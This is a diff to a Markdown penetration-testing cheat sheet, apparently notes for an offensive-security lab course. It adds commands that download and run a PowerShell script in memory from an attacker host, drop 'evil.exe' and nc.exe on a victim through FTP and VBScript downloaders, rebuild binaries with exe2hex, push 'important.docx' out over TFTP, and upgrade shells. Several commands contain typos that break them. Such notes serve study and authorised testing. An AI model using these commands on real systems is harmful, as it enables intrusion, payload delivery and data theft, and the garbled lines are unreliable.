@@ -16,7 +16,7 @@ Get help for particular nse script
 
 `nmap --script-help svn-brute.nse`
 
-## Transfer files
+## File Transfer
 
 * Transfering files with SCP
 
@@ -54,6 +54,13 @@ powershell -c "(new-object System.Net.WebClient).DownloadFile('http:/
 /10.11.0.4/wget.exe','C:\Users\offsec\Desktop\wget.exe')"
 ```
 
+Download and run powershell script without saving it to the victim hard disk.
+
+```
+powershell.exe IEX (New-Object System.Net,WebClient),DownloadString('
+http://10.11.15.15/helloworld.ps1')
+```
+
 * Powercat file transfer
 
 ```
@@ -63,6 +70,88 @@ powercat -c 10.11.0.4 -p 443 -i C:\Users\Offsec\powercat.ps1
 sudo nc -lnvp 443 > receiving_powercat.ps1
 ```
 
+* FTP file transfer
+
+```
+// install ftp server on linux
+sudo apt update && sudo apt install pure-ftpd
+sudo systemctl restart pure-ftpd
+
+//transfer files
+ftp -v -n -s:ftp.txt
+
+// create ftp.txt
+echo open 10.11.0.21> ftp.txt
+echo USER offsec>> ftp.txt
+echo password>> ftp.txt
+echo bin>> ftp.txt
+echo GET nc.exe >> ftp.t xt
+echo bye >> ftp.txt
+```
+
+* VBScript HTTP downloader script
+
+```
+echo strUrl = WScript.Arguments.Item(0) > wget.vbs
+echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
+echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
+echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
+echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
+echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget. vbs
+echo Dim http, varByteArray, strData, strBuffer, lngCounter , fs, ts>> wget.vbs
+echo Err.Clear>> wget.vbs
+echo Set http= Nothing>> wget.vbs
+echo Set http = CreateObject( "WinHttp.WinHttpRequest.5.1")>> wget.vbs
+echo If http Is Nothing Then Set http=CreateObject("WinHttp.WinHttpRequest")>> wge
+t.vbs
+echo If http Is Nothing Then Set http=Create0bject( "MSXML2.ServerXMLHTTP" ) >> wget.vbs
+echo If http Is Nothing Then Set http=CreateObject( "Microsoft.XMLHTTP") >> wget.vbs
+echo http.Open "GET" , strURL, False>> wget.vbs
+echo http.Send>> wget.vbs
+echo var ByteArray = http.ResponseBody >>wget.vbs
+echo Set http= Nothing>> wget.vbs
+echo Set fs = CreateObject("Scripting.FileSystemObject" ) >>wget.vbs
+echo Set ts = fs.CreateTextFile(StrFile, True) >> wget. vbs
+echo strData = "" >> wget.vbs
+echo strBuffer = "" >> wget.vbs
+echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
+echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs
+echo Next>> wget.vbs
+echo ts.Close>> wget.vbs
+```
+
+Using downloader to download files
+
+```
+C:\Users\Offsec> cscript wget.vbs http://10.11.15.56/evil.exe evil.exe
+```
+
+* converting exe to hex and using powershell commands to build the exe back
+
+```
+// PE compression tool to compress the file
+upx -9 nc.exe
+
+// convert the exe to hex
+exe2hex -x nc.exe -p nc.cmd
+
+// copy commands from nc.cmd to clipboard
+cat nc.cmd | xclip -selection clipboard
+
+// paste the commands to build nc.exe back on windows
+```
+
+* TFTP to upload files from windows
+
+```
+C:\Users\Offsec> tftp -i 10.11.8.4 put important.docx
+
+// create tftp daemon on linux
+sudo apt update && sudo apt install atftp
+sudo mkdir /tftp
+sudo chown nobody: /tftp
+sudo atftpd --daemon --port 69 /tftp
+```
 
 ## Directory Brute Force
 
@@ -328,4 +417,11 @@ python3 -m http.server 7331
 php -S 0.0.0.0:8888
 ruby -run -e httpd . -p 9008
 busybox httpd -f -p 18880
+```
+
+## Upgrading a Non-Interactive Shell
+
+```
+python -c 'import pty; pty.spawn("/bin/bash") '
+ash -i 2>&1
 ```
